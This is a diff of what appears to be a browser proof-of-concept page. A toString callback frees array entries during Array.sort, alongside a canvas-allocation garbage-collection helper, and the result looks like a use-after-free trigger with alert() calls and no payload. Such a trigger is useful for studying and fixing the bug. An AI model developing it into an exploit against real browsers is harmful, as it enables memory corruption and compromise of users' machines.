@@ -5,8 +5,8 @@ function gc() {
         var c = document.createElement("canvas");
         var gl = c.getContext("2d");
 
-        for (var i = 0; i < 0x100; i++) {
-            var gggg = gl.createImageData(1, 0x10000)
+        for (var i = 0; i < 0x10000; i++) {
+            var gggg = gl.createImageData(1, 0x10)
         }
     } catch (e) {
 
@@ -18,7 +18,7 @@ function sleep(d){
 try{
 alert(223)
 var c = new Array(0x1000)
-var b = {'a':1,'b':2, 'c':3}
+var b = new Array();
 var a = [b,{toString:function(){
  a[0] = null;
  b = null
@@ -27,17 +27,13 @@ var a = [b,{toString:function(){
  //}
  sleep(1000)
  alert(111)
- for (var j=0; j < c.length; j++) {
-	c[j] = {'a':7,'b':2, 'c':3}
-	//c[j].toString = function(){alert('ok'); return '666'}
- }
 this.toString = function(){return '123'}
  return "aaa";
 }}, 2]
 a.sort();
 alert(a[0]);
-alert(a[1].a);
+alert(a[1]);
 alert(a[2]);
-//alert(a[3]);
+alert(a[3]);
 }catch(e){alert(e)}
 </script>
